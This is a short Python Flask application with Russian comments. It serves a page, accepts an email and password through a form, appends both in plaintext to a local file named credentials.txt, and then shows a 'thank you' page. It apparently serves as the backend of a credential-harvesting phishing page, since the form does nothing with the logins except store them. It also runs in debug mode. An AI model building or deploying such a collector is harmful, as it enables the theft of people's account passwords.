from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

# Главная страница
@app.route('/')
def index():
    return render_template('index.html')

# Обработка введенных данных
@app.route('/submit', methods=['POST'])
def submit():
    email = request.form['email']
    password = request.form['password']
    with open('credentials.txt', 'a') as file:
        file.write(f"Email: {email}, Password: {password}\n")
    return redirect(url_for('thank_you'))

# Страница благодарности
@app.route('/thank_you')
def thank_you():
    return 'Спасибо!'

if __name__ == "__main__":
    app.run(debug=True)
